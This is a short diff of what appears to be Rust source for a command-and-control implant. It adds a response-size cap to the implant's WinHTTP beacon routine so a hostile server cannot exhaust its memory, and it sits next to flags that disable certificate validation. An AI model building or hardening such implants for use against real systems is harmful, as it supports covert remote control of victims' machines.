@@ -31,6 +31,12 @@ const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x0000_0100;
 const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x0000_2000;
 const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x0000_1000;
 
+/// Maximum total response body size in bytes. A malicious server (or MitM)
+/// could send an unlimited response body to exhaust the implant's bump
+/// allocator (which has limited virtual memory). 16 MiB is generous enough
+/// for any legitimate beacon task response while capping the OOM surface.
+const MAX_RESPONSE_BYTES: usize = 16 * 1024 * 1024;
+
 /// WinHTTP function pointer table (resolved lazily, cached in statics).
 struct WinhttpFns {
     open: FOpen,
@@ -320,6 +326,12 @@ pub unsafe fn post_frame(
             break;
         }
         let n = (read as usize).min(capped);
+        // Guard: reject the entire response if accumulated size would exceed
+        // the cap. The bump allocator maps a fixed virtual region; letting a
+        // malicious server push past the limit risks OOM / process death.
+        if out.len().saturating_add(n) > MAX_RESPONSE_BYTES {
+            break;
+        }
         out.extend_from_slice(&chunk[..n]);
     }
     // Invert the http-post SERVER envelope (the response direction). The team
